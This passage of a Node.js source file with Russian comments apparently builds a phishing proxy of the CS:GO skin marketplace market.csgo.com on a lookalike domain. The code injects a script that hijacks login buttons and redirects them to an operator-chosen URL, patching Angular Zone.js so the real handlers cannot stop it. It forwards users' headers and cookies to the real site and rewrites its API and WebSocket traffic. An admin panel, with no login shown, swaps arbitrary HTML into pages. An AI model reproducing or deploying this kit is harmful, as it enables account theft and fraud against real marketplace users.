                    HTMLElement.prototype[ADD_EVENT_LISTENER] = function(eventName, handler, useCapture) {
                        // Если это кнопка логина
                        if (targetSelectors.some(sel => 
                            this.matches && (this.matches(sel) || this.closest(sel)))) {
                            
                            // Для событий клика 
                            if (eventName === 'click' || eventName === 'mousedown') {
                                console.log('Перехвачено Zone.js событие', eventName);
                                
                                // Заменяем обработчик
                                return originalZoneAEL.call(this, eventName, function(e) {
                                    // Разрешаем некоторые эффекты для mousedown (ripple)
                                    if (eventName === 'mousedown') {
                                        setTimeout(() => {
                                            window.location.href = targetUrl;
                                        }, 150);
                                        return;
                                    }
                                    
                                    // Для click сразу блокируем и редиректим
                                    e.preventDefault();
                                    e.stopPropagation();
                                    window.location.href = targetUrl;
                                    return false;
                                }, true);
                            }
                        }
                        
                        // Для других элементов используем оригинальный метод
                        return originalZoneAEL.call(this, eventName, handler, useCapture);
                    };
                }
            } catch (e) {
                console.error('Ошибка при патче Angular Zone.js:', e);
            }
        }
    }
    
    // Запускаем перехват сразу
    enhanceLoginButtons();
    
    // Устанавливаем глобальный перехват
    setupGlobalCapture();
    
    // Пробуем патчить Angular Zone.js с задержкой
    setTimeout(patchAngularZone, 500);
    
    // Также проверяем периодически для динамически добавляемых кнопок
    setInterval(enhanceLoginButtons, 1000);
    
    // Используем MutationObserver для отслеживания DOM изменений
    const observer = new MutationObserver(mutations => {
        enhanceLoginButtons();
    });
    
    // Наблюдаем за всем документом
    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });
    
    console.log('✅ Перехват кнопок входа с сохранением стилей успешно установлен');
})();
</script>
        `;
        
        modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
        modified = modified.replace('</body>', loginButtonsScript + '</body>');
    }
    
    // Специфичные замены для JavaScript
    if (contentType.includes('javascript')) {
        modified = modified.replace(/"\/api\//g, `"${baseUrl}/api/`);
        modified = modified.replace(/'\/api\//g, `'${baseUrl}/api/`);
        
        // Корректная замена WebSocket URLs в JavaScript
        modified = modified.replace(/centrifugo2\.csgotrader\.app/g, 
            hostWithoutProtocol + '/ws');
            
        // Улучшена обработка GraphQL URLs
        modified = modified.replace(/['"]https:\/\/market\.csgo\.com\/api\/graphql['"]/g, 
            `'${baseUrl}/api/graphql'`);
            
        // ИСПРАВЛЕНО: Добавлена обработка GQL ошибок
        if (modified.includes('GQL fail') || modified.includes('viewItem')) {
            modified = modified.replace(/console\.error\(['"]GQL fail/g, 
                'console.warn("GQL fail handled:" + ');
                
            // Оборачиваем вызовы viewItem в try/catch
            modified = modified.replace(
                /return(\s+)viewItem\(/g, 
                'try { return$1viewItem('
            );
            modified = modified.replace(
                /viewItem\(([^)]*)\);/g, 
                'viewItem($1).catch(err => console.warn("Handled viewItem error:", err));'
            );
        }
        
        // ИСПРАВЛЕНО: Исправление для chunk-FWBJZS6X.js:2957
        if (modified.includes('chunk-FWBJZS6X.js') || modified.includes('[chunk-FWBJZS6X.js:3012:33350]')) {
            console.log('Applying fixes for problematic chunk-FWBJZS6X.js');
            
            // Предотвращаем падение при ошибках
            modified = modified.replace(
                /throw new Error\(['"]GQL fail/g,
                'console.warn("Handled GQL error:"'
            );
            
            // Добавляем обработку ошибок для ajax/fetch запросов
            modified = modified.replace(
                /(\.then\()function\s*\(\s*([a-zA-Z0-9_]+)\s*\)\s*{/g,
                '$1function($2) { try {'
            );
            
            modified = modified.replace(
                /}\)\.catch\(/g,
                '} catch(err) { console.warn("Handled error in then:", err); } })\.catch('
            );
        }
    }
    
    // Специфичные замены для CSS
    if (contentType.includes('css')) {
        modified = modified.replace(/url\(['"]?\//g, `url('${baseUrl}/`);
        modified = modified.replace(/url\(['"]?http:\/\//g, `url('${baseUrl.replace('https:', 'http:')}/`);
    }
    
    return modified;
}

// ИСПРАВЛЕНО: Улучшенная обработка WebSocket прокси с повторными попытками
const wsProxy = new WebSocket.Server({ 
    noServer: true,
    clientTracking: true,
    perMessageDeflate: true
});

// Карта для отслеживания активных соединений
const activeWSConnections = new Map();

server.on('upgrade', (request, socket, head) => {
    const pathname = url.parse(request.url).pathname;
    
    // Улучшена обработка WebSocket путей
    if (pathname === '/ws' || pathname.startsWith('/ws/') || pathname.includes('connection/websocket')) {
        wsProxy.handleUpgrade(request, socket, head, (ws) => {
            handleWebSocketProxy(ws, request);
        });
    } else {
        socket.destroy();
    }
});

// ИСПРАВЛЕНО: Улучшенная функция обработки WebSocket соединений с повторными попытками
function handleWebSocketProxy(clientWs, request) {
    try {
        // Корректное построение целевого URL
        let wsPath = request.url.replace('/ws', '');
        if (!wsPath.includes('connection/websocket')) {
            wsPath += '/connection/websocket';
        }
        
        const targetUrl = WS_TARGET + wsPath;
        console.log('WebSocket proxy:', targetUrl);
        
        // Генерируем уникальный ID для соединения
        const connectionId = Math.random().toString(36).substring(2, 15);
        
        // Сохраняем информацию о соединении
        activeWSConnections.set(connectionId, {
            clientWs,
            targetWs: null,
            url: targetUrl,
            connected: false,
            retryCount: 0,
            lastActivity: Date.now(),
            buffer: [] // Буфер для сообщений до установки соединения
        });
        
        // Функция для подключения к целевому WebSocket с повторными попытками
        function connectToTarget(retryCount = 0) {
            const MAX_RETRIES = 5;
            const RETRY_DELAY = 2000 * Math.pow(1.5, retryCount);
            
            if (retryCount >= MAX_RETRIES) {
                console.error(`WebSocket connection failed after ${MAX_RETRIES} attempts`);
                clientWs.close(1011, `Failed to connect after ${MAX_RETRIES} attempts`);
                activeWSConnections.delete(connectionId);
                return;
            }
            
            console.log(`Attempting WebSocket connection (attempt ${retryCount + 1}): ${targetUrl}`);
            
            // Добавлены более надежные заголовки для WebSocket соединения
            const targetWs = new WebSocket(targetUrl, {
                headers: {
                    'Origin': 'https://market.csgo.com',
                    'User-Agent': request.headers['user-agent'] || 'Mozilla/5.0',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'Sec-WebSocket-Protocol': request.headers['sec-websocket-protocol'] || '',
                    'Sec-WebSocket-Extensions': request.headers['sec-websocket-extensions'] || '',
                    ...request.headers
                },
                followRedirects: true,
                handshakeTimeout: 15000
            });
            
            // Сохраняем целевой WebSocket в Map
            const connectionInfo = activeWSConnections.get(connectionId);
            if (connectionInfo) {
                connectionInfo.targetWs = targetWs;
                connectionInfo.retryCount = retryCount;
            }
            
            // Обработка открытия соединения
            targetWs.on('open', () => {
                console.log(`Target WebSocket connected successfully (${connectionId})`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo) {
                    connectionInfo.connected = true;
                    connectionInfo.lastActivity = Date.now();
                    
                    // Отправляем буферизованные сообщения, если они есть
                    if (connectionInfo.buffer.length > 0) {
                        console.log(`Sending ${connectionInfo.buffer.length} buffered messages`);
                        connectionInfo.buffer.forEach(message => {
                            try {
                                targetWs.send(message);
                            } catch (err) {
                                console.error('Error sending buffered message:', err.message);
                            }
                        });
                        connectionInfo.buffer = [];
                    }
                }
            });
            
            // Client -> Server с обработкой ошибок и буферизацией
            clientWs.on('message', (message) => {
                try {
                    const connectionInfo = activeWSConnections.get(connectionId);
                    if (!connectionInfo) return;
                    
                    connectionInfo.lastActivity = Date.now();
                    
                    if (connectionInfo.connected && connectionInfo.targetWs.readyState === WebSocket.OPEN) {
                        connectionInfo.targetWs.send(message);
                    } else {
                        // Буферизуем сообщения, если соединение еще не установлено
                        console.log(`Buffering message for later delivery (${connectionId})`);
                        connectionInfo.buffer.push(message);
                    }
                } catch (err) {
                    console.error('Error sending message to target:', err.message);
                }
            });
            
            // Server -> Client с обработкой ошибок
            targetWs.on('message', (message) => {
                try {
                    const connectionInfo = activeWSConnections.get(connectionId);
                    if (!connectionInfo) return;
                    
                    connectionInfo.lastActivity = Date.now();
                    
                    if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                        connectionInfo.clientWs.send(message);
                    }
                } catch (err) {
                    console.error('Error sending message to client:', err.message);
                }
            });
            
            // Обработка закрытия соединений
            clientWs.on('close', (code, reason) => {
                console.log(`Client WebSocket closed (${connectionId}): ${code} ${reason}`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo && connectionInfo.targetWs) {
                    if (connectionInfo.targetWs.readyState === WebSocket.OPEN || 
                        connectionInfo.targetWs.readyState === WebSocket.CONNECTING) {
                        connectionInfo.targetWs.close(code, reason);
                    }
                }
                
                activeWSConnections.delete(connectionId);
            });
            
            targetWs.on('close', (code, reason) => {
                console.log(`Target WebSocket closed (${connectionId}): ${code} ${reason}`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (!connectionInfo) return;
                
                // Если это не преднамеренное закрытие, пытаемся переподключиться
                if (code !== 1000 && code !== 1001 && 
                    connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    
                    console.log(`Attempting to reconnect WebSocket (${connectionId})...`);
                    
                    // Уведомляем клиента о переподключении
                    try {
                        connectionInfo.clientWs.send(JSON.stringify({
                            type: 'reconnecting',
                            message: 'Connection lost, attempting to reconnect...'
                        }));
                    } catch (e) {
                        // Игнорируем ошибки при отправке
                    }
                    
                    // Устанавливаем статус соединения
                    connectionInfo.connected = false;
                    
                    // Пытаемся переподключиться с задержкой
                    setTimeout(() => {
                        connectToTarget(connectionInfo.retryCount + 1);
                    }, 2000);
                    
                } else if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    // Если это преднамеренное закрытие, закрываем клиентское соединение
                    connectionInfo.clientWs.close(code, reason);
                    activeWSConnections.delete(connectionId);
                }
            });
            
            // Обработка ошибок соединений
            clientWs.on('error', (err) => {
                console.error(`Client WebSocket error (${connectionId}):`, err.message);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo && connectionInfo.targetWs) {
                    if (connectionInfo.targetWs.readyState === WebSocket.OPEN || 
                        connectionInfo.targetWs.readyState === WebSocket.CONNECTING) {
                        connectionInfo.targetWs.close(1011, 'Client error');
                    }
                }
                
                activeWSConnections.delete(connectionId);
            });
            
            targetWs.on('error', (err) => {
                console.error(`Target WebSocket error (${connectionId}):`, err.message);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (!connectionInfo) return;
                
                // Если клиент еще подключен, пытаемся переподключиться к серверу
                if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    // Уведомляем клиента о проблеме
                    try {
                        connectionInfo.clientWs.send(JSON.stringify({
                            type: 'error',
                            message: 'Connection to server failed, attempting to reconnect...'
                        }));
                    } catch (e) {
                        // Игнорируем ошибки при отправке
                    }
                    
                    // Устанавливаем статус соединения
                    connectionInfo.connected = false;
                    
                    // Пытаемся переподключиться с задержкой
                    setTimeout(() => {
                        connectToTarget(connectionInfo.retryCount + 1);
                    }, 2000);
                }
            });
        }
        
        // Инициируем первое подключение
        connectToTarget(0);
        
    } catch (error) {
        console.error('WebSocket proxy setup error:', error.message);
        if (clientWs.readyState === WebSocket.OPEN) {
            clientWs.close(1011, 'WebSocket proxy error');
        }
    }
}

// Периодическая проверка активности WebSocket соединений
setInterval(() => {
    const now = Date.now();
    
    for (const [id, connection] of activeWSConnections.entries()) {
        const inactiveTime = now - connection.lastActivity;
        
        // Если соединение неактивно более 2 минут, отправляем ping для проверки
        if (inactiveTime > 2 * 60 * 1000) {
            console.log(`WebSocket inactive for ${Math.round(inactiveTime/1000)}s (${id}), sending ping`);
            
            try {
                if (connection.connected && connection.targetWs.readyState === WebSocket.OPEN) {
                    connection.targetWs.ping();
                }
                
                if (connection.clientWs.readyState === WebSocket.OPEN) {
                    connection.clientWs.ping();
                }
                
                // Обновляем время активности
                connection.lastActivity = now;
            } catch (e) {
                console.warn(`Error sending ping for connection ${id}:`, e.message);
            }
        }
        
        // Если соединение неактивно более 5 минут, закрываем его
        if (inactiveTime > 5 * 60 * 1000) {
            console.log(`Closing inactive WebSocket connection (${id})`);
            
            try {
                if (connection.targetWs && 
                   (connection.targetWs.readyState === WebSocket.OPEN || 
                    connection.targetWs.readyState === WebSocket.CONNECTING)) {
                    connection.targetWs.close(1000, 'Connection timeout');
                }
                
                if (connection.clientWs.readyState === WebSocket.OPEN) {
                    connection.clientWs.close(1000, 'Connection timeout');
                }
            } catch (e) {
                console.warn(`Error closing inactive connection ${id}:`, e.message);
            }
            
            activeWSConnections.delete(id);
        }
    }
}, 60 * 1000); // Проверка каждую минуту

// УЛУЧШЕНО: Админ API для проверки кастомных страниц с более надежным матчингом URL
app.get('/admin-api/check-custom-page', (req, res) => {
    const urlToCheck = req.query.url;
    
    if (!urlToCheck) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // Декодируем URL для корректного сравнения
    const decodedUrl = decodeURIComponent(urlToCheck);
    
    // Улучшенное сопоставление URL с учетом возможных шаблонов (wildcards)
    let hasCustomizations = false;
    let matchedUrl = null;
    
    for (const [pageUrl, config] of customPages.entries()) {
        // Точное совпадение
        if (pageUrl === decodedUrl || pageUrl === urlToCheck) {
            hasCustomizations = true;
            matchedUrl = pageUrl;
            break;
        }
        
        // Проверка на шаблон со звездочкой
        if (pageUrl.includes('*')) {
            const escapeRegExp = (string) => string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            const pattern = escapeRegExp(pageUrl).replace(/\\\*/g, '.*');
            const regex = new RegExp('^' + pattern + '$');
            
            if (regex.test(decodedUrl) || regex.test(urlToCheck)) {
                hasCustomizations = true;
                matchedUrl = pageUrl;
                break;
            }
        }
        
        // Проверка по ID товара
        if (decodedUrl.includes('id=') && pageUrl.includes('id=')) {
            const urlIdMatch = /id=([0-9]+)/.exec(decodedUrl);
            const pageUrlIdMatch = /id=([0-9]+)/.exec(pageUrl);
            
            if (urlIdMatch && pageUrlIdMatch && urlIdMatch[1] === pageUrlIdMatch[1]) {
                hasCustomizations = true;
                matchedUrl = pageUrl;
                break;
            }
        }
        
        // Проверка по пути без параметров
        const urlPath = decodedUrl.split('?')[0];
        const pageUrlPath = pageUrl.split('?')[0];
        
        if (urlPath === pageUrlPath) {
            hasCustomizations = true;
            matchedUrl = pageUrl;
            break;
        }
    }
    
    // Оптимизированные кэширующие заголовки - отключаем кеширование для более частых проверок
    res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    
    res.json({ 
        hasCustomizations,
        matchedUrl: matchedUrl,
        timestamp: Date.now()
    });
});

// УЛУЧШЕНО: Админ API для получения настроек кастомной страницы с более надежным поиском
app.get('/admin-api/get-custom-page', (req, res) => {
    const urlToCheck = req.query.url;
    
    if (!urlToCheck) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // Декодируем URL для корректного сравнения
    const decodedUrl = decodeURIComponent(urlToCheck);
    
    // Поиск подходящей настройки с учетом шаблонов
    let customization = null;
    let matchedUrl = null;
    
    for (const [pageUrl, config] of customPages.entries()) {
        // Точное совпадение
        if (pageUrl === decodedUrl || pageUrl === urlToCheck) {
            customization = config;
            matchedUrl = pageUrl;
            break;
        }
        
        // Проверка на шаблон со звездочкой
        if (pageUrl.includes('*')) {
            const escapeRegExp = (string) => string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            const pattern = escapeRegExp(pageUrl).replace(/\\\*/g, '.*');
            const regex = new RegExp('^' + pattern + '$');
            
            if (regex.test(decodedUrl) || regex.test(urlToCheck)) {
                customization = config;
                matchedUrl = pageUrl;
                break;
            }
        }
        
        // Проверка по ID товара
        if (decodedUrl.includes('id=') && pageUrl.includes('id=')) {
            const urlIdMatch = /id=([0-9]+)/.exec(decodedUrl);
            const pageUrlIdMatch = /id=([0-9]+)/.exec(pageUrl);
            
            if (urlIdMatch && pageUrlIdMatch && urlIdMatch[1] === pageUrlIdMatch[1]) {
                customization = config;
                matchedUrl = pageUrl;
                break;
            }
        }
        
        // Проверка по пути без параметров
        const urlPath = decodedUrl.split('?')[0];
        const pageUrlPath = pageUrl.split('?')[0];
        
        if (urlPath === pageUrlPath) {
            customization = config;
            matchedUrl = pageUrl;
            break;
        }
    }
    
    if (!customization) {
        return res.status(404).json({ 
            error: 'Custom page configuration not found',
            checkedUrl: decodedUrl
        });
    }
    
    // Отключаем кеширование для более надежного обновления
    res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    
    res.json({
        ...customization,
        matchedUrl: matchedUrl,
        requestedUrl: decodedUrl
    });
});

// НОВОЕ: Добавим API для отладки модификаций
app.get('/admin-api/debug-modifications', (req, res) => {
    try {
        // Собираем информацию о всех активных модификациях
        const debugInfo = {
            activeModifications: Array.from(customPages.entries()).map(([url, config]) => ({
                url,
                selector: config.selector,
                value: config.value,
                lastModified: config.timestamp,
                formattedTimestamp: new Date(config.timestamp).toLocaleString()
            })),
            serverInfo: {
                time: new Date().toISOString(),
                uptime: process.uptime(),
                nodeVersion: process.version,
                memory: process.memoryUsage()
            }
        };
        
        res.json(debugInfo);
    } catch (error) {
        console.error('Error in debug endpoint:', error);
        res.status(500).json({ error: 'Internal server error during debug', message: error.message });
    }
});

// УЛУЧШЕНО: Админ API для сохранения настроек с лучшей обработкой URL
app.post('/admin-api/save-custom-page', express.json(), (req, res) => {
    const { url, selector, value } = req.body;
    
    if (!url || !selector || value === undefined) {
        return res.status(400).json({ error: 'URL, selector, and value are required' });
    }
    
    // Нормализуем URL для более надежного сопоставления
    const normalizedUrl = url.trim();
    
    // Валидируем селектор
    try {
        // Простая проверка синтаксиса селектора
        if (selector.includes('<') && selector.includes('>')) {
            throw new Error('Selector contains HTML tags');
        }
    } catch (e) {
        return res.status(400).json({ error: 'Invalid CSS selector: ' + e.message });
    }
    
    console.log(`Saving custom page modification for URL: ${normalizedUrl}`);
    
    // Сохраняем настройки
    customPages.set(normalizedUrl, {
        selector,
        value,
        timestamp: Date.now()
    });
    
    // Сохраняем в файл
    saveCustomPages();
    
    // Очищаем все связанные с этим URL модификации, которые могут быть дубликатами
    // для разных вариантов URL одной и той же страницы
    for (const [pageUrl, config] of customPages.entries()) {
        // Пропускаем текущий URL
        if (pageUrl === normalizedUrl) continue;
        
        // Проверка, относится ли URL к той же странице
        const urlPath = normalizedUrl.split('?')[0];
        const pageUrlPath = pageUrl.split('?')[0];
        
        // Если базовый путь совпадает и это не шаблон, удаляем дублирующие настройки
        if (urlPath === pageUrlPath && !pageUrl.includes('*')) {
            console.log(`Removing duplicate URL: ${pageUrl}`);
            customPages.delete(pageUrl);
        }
        
        // Если указаны одинаковые ID товара
        if (normalizedUrl.includes('id=') && pageUrl.includes('id=')) {
            const urlIdMatch = /id=([0-9]+)/.exec(normalizedUrl);
            const pageUrlIdMatch = /id=([0-9]+)/.exec(pageUrl);
            
            if (urlIdMatch && pageUrlIdMatch && urlIdMatch[1] === pageUrlIdMatch[1] && pageUrl !== normalizedUrl) {
                console.log(`Removing duplicate URL with same ID: ${pageUrl}`);
                customPages.delete(pageUrl);
            }
        }
    }
    
    // Сохраняем изменения после удаления дубликатов
    saveCustomPages();
    
    res.json({ 
        success: true, 
        message: 'Custom page configuration saved',
        timestamp: Date.now()
    });
});

// НОВОЕ: Админ API для валидации селектора
app.post('/admin-api/validate-selector', express.json(), (req, res) => {
    const { selector } = req.body;
    
    if (!selector) {
        return res.status(400).json({ error: 'Selector is required' });
    }
    
    try {
        // Проверяем селектор на синтаксическую валидность
        // Для этого используем простую эвристику
        const valid = !(/[<>]/.test(selector) && !/<[^>]*>/.test(selector));
        
        res.json({ 
            valid,
            message: valid ? 'Selector appears to be valid' : 'Selector contains invalid characters'
        });
    } catch (e) {
        res.status(400).json({ 
            valid: false,
            error: e.message 
        });
    }
});

// НОВОЕ: Админ API для проверки применения модификаций
app.get('/admin-api/check-modifications-status', (req, res) => {
    res.json({
        active: customPages.size,
        lastUpdated: Math.max(...Array.from(customPages.values()).map(page => page.timestamp || 0), 0),
        serverTime: Date.now()
    });
});

// Админ API для удаления настроек кастомной страницы
app.post('/admin-api/delete-custom-page', express.json(), (req, res) => {
    const { url } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // Удаляем настройки
    const deleted = customPages.delete(url);
    
    // Сохраняем изменения
    saveCustomPages();
    
    if (deleted) {
        res.json({ success: true, message: 'Custom page configuration deleted' });
    } else {
        res.status(404).json({ error: 'Custom page configuration not found' });
    }
});

// Админ API для сброса всех настроек кастомных страниц
app.post('/admin-api/reset-all-custom-pages', express.json(), (req, res) => {
    try {
        // Очищаем все кастомные страницы
        customPages.clear();
        
        // Сохраняем изменения
        saveCustomPages();
        
        res.json({ success: true, message: 'All custom page configurations have been reset' });
    } catch (error) {
        console.error('Error resetting custom pages:', error);
        res.status(500).json({ error: 'Internal server error while resetting custom pages' });
    }
});

// Админ API для получения списка всех кастомных страниц
app.get('/admin-api/list-custom-pages', (req, res) => {
    const list = Array.from(customPages.entries()).map(([url, config]) => ({
        url,
        selector: config.selector,
        value: config.value,
        timestamp: config.timestamp
    }));
    
    res.json(list);
});

// Добавляем API для очистки кеша
app.post('/admin-api/clear-cache', (req, res) => {
    try {
        // Очищаем кеш в браузере пользователя с помощью специальных заголовков
        res.set('Clear-Site-Data', '"cache", "cookies", "storage"');
        res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.set('Pragma', 'no-cache');
        res.set('Expires', '0');
        
        // Возвращаем успешный ответ
        res.json({ success: true, message: 'Кеш успешно очищен' });
    } catch (error) {
        console.error('Ошибка при очистке кеша:', error);
        res.status(500).json({ success: false, error: 'Внутренняя ошибка сервера при очистке кеша' });
    }
});

// Админ-панель с улучшенным интерфейсом
app.get('/adminka', (req, res) => {
    // HTML для админ-панели
    const html = `
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Админ-панель CSGO Market Proxy</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                padding: 20px;
                background-color: #f8f9fa;
            }
            .card {
                margin-bottom: 20px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
            .form-control {
                margin-bottom: 15px;
            }
            .list-group-item {
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .badge {
                font-size: 0.8em;
            }
            .value-preview {
                max-width: 150px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            .actions {
                display: flex;
                gap: 5px;
            }
            .modified-time {
                font-size: 0.8em;
                color: #6c757d;
            }
            .url-preview {
                max-width: 250px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            .toast-container {
                position: fixed;
                top: 20px;
                right: 20px;
                z-index: 1000;
            }
            .preview-content {
                background-color: white;
                border: 1px solid #ddd;
                padding: 10px;
                border-radius: 4px;
                margin-top: 5px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="mb-4">Админ-панель CSGO Market Proxy</h1>
            
            <div class="row">
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header bg-primary text-white">
                            <h5 class="card-title mb-0">Добавить/Изменить настройки страницы</h5>
                        </div>
                        <div class="card-body">
                            <form id="customPageForm">
                                <div class="mb-3">
                                    <label for="pageUrl" class="form-label">URL страницы</label>
                                    <input type="text" class="form-control" id="pageUrl" placeholder="https://market-csgo.co/ru/Rifle/AK-47/..." required>
                                    <div class="form-text">Полный URL страницы, которую хотите модифицировать. Можно использовать '*' как подстановочный знак.</div>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="cssSelector" class="form-label">CSS селектор</label>
                                    <input type="text" class="form-control" id="cssSelector" placeholder="#app > app-main-site > div > ..." required>
                                    <div class="form-text">CSS селектор элемента, значение которого нужно изменить</div>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="customValue" class="form-label">Новое значение</label>
                                    <textarea class="form-control" id="customValue" rows="3" placeholder="Введите новое значение..." required></textarea>
                                    <div class="form-text">HTML-код или текст, который будет отображаться в выбранном элементе</div>
                                </div>
                                
                                <button type="submit" class="btn btn-primary">Сохранить</button>
                                <button type="button" id="testButton" class="btn btn-outline-secondary ms-2">Проверить селектор</button>
                                <button type="button" id="refreshCacheBtn" class="btn btn-outline-info ms-2">Сбросить кеш</button>
                            </form>
                        </div>
                    </div>
                </div>
                
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header bg-info text-white d-flex justify-content-between align-items-center">
                            <h5 class="card-title mb-0">Список модифицированных страниц</h5>
                            <button type="button" id="resetAllBtn" class="btn btn-sm btn-outline-light">Сбросить все</button>
                        </div>
                        <div class="card-body">
                            <div class="list-group" id="customPagesList">
                                <div class="text-center py-4 text-muted">
                                    <div class="spinner-border spinner-border-sm" role="status">
                                        <span class="visually-hidden">Загрузка...</span>
                                    </div>
                                    Загрузка списка...
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal для подтверждения удаления -->
        <div class="modal fade" id="deleteModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-danger text-white">
                        <h5 class="modal-title">Подтверждение удаления</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Вы уверены, что хотите удалить настройки для страницы?</p>
                        <p id="deleteModalUrl" class="text-break small"></p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Отмена</button>
                        <button type="button" class="btn btn-danger" id="confirmDelete">Удалить</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal для просмотра деталей -->
        <div class="modal fade" id="detailsModal" tabindex="-1">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title">Детали модификации</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label fw-bold">URL:</label>
                            <div id="detailUrl" class="text-break"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">CSS селектор:</label>
                            <div id="detailSelector" class="text-break"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">Значение:</label>
                            <div id="detailValue" class="border p-2 bg-light"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">Дата изменения:</label>
                            <div id="detailTimestamp"></div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Закрыть</button>
                        <a href="#" class="btn btn-primary" id="viewPageBtn" target="_blank">Открыть страницу</a>
                        <button type="button" class="btn btn-warning" id="editItemBtn">Редактировать</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal для подтверждения сброса всех настроек -->
        <div class="modal fade" id="resetAllModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-danger text-white">
                        <h5 class="modal-title">Подтверждение сброса</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p><strong>Вы уверены, что хотите сбросить ВСЕ модификации?</strong></p>
                        <p>Это действие нельзя отменить. Все модификации будут удалены.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Отмена</button>
                        <button type="button" class="btn btn-danger" id="confirmResetAll">Сбросить все</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Система уведомлений -->
        <div class="toast-container"></div>
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            // Глобальные переменные
            let deleteUrl = '';
            let customPagesList = [];
            
            // DOM элементы
            const form = document.getElementById('customPageForm');
            const pageUrlInput = document.getElementById('pageUrl');
            const cssSelectorInput = document.getElementById('cssSelector');
            const customValueInput = document.getElementById('customValue');
            const customPagesListEl = document.getElementById('customPagesList');
            const deleteModal = new bootstrap.Modal(document.getElementById('deleteModal'));
            const detailsModal = new bootstrap.Modal(document.getElementById('detailsModal'));
            const resetAllModal = new bootstrap.Modal(document.getElementById('resetAllModal'));
            const confirmDeleteBtn = document.getElementById('confirmDelete');
            const confirmResetAllBtn = document.getElementById('confirmResetAll');
            const resetAllBtn = document.getElementById('resetAllBtn');
            const testButton = document.getElementById('testButton');
            
            // Функция для показа уведомлений
            function showToast(message, type = 'success') {
                const toastContainer = document.querySelector('.toast-container');
                
                const toastEl = document.createElement('div');
                toastEl.className = `toast align-items-center text-white bg-${type}`;
                toastEl.setAttribute('role', 'alert');
                toastEl.setAttribute('aria-live', 'assertive');
                toastEl.setAttribute('aria-atomic', 'true');
                
                toastEl.innerHTML = `
                    <div class="d-flex">
                        <div class="toast-body">
                            ${message}
                        </div>
                        <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
                    </div>
                `;
                
                toastContainer.appendChild(toastEl);
                
                const toast = new bootstrap.Toast(toastEl, {
                    autohide: true,
                    delay: 3000
                });
                
                toast.show();
                
                // Удаляем элемент после скрытия
                toastEl.addEventListener('hidden.bs.toast', () => {
                    toastEl.remove();
                });
            }
            
            // Форматирование даты
            function formatDate(timestamp) {
                if (!timestamp) return 'Неизвестно';
                
                const date = new Date(timestamp);
                return date.toLocaleString('ru-RU', {
                    year: 'numeric',
                    month: 'numeric',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
            }
            
            // Загрузка списка модифицированных страниц
            async function loadCustomPages() {
                try {
                    const response = await fetch('/admin-api/list-custom-pages');
                    if (!response.ok) throw new Error('Ошибка при загрузке списка');
                    
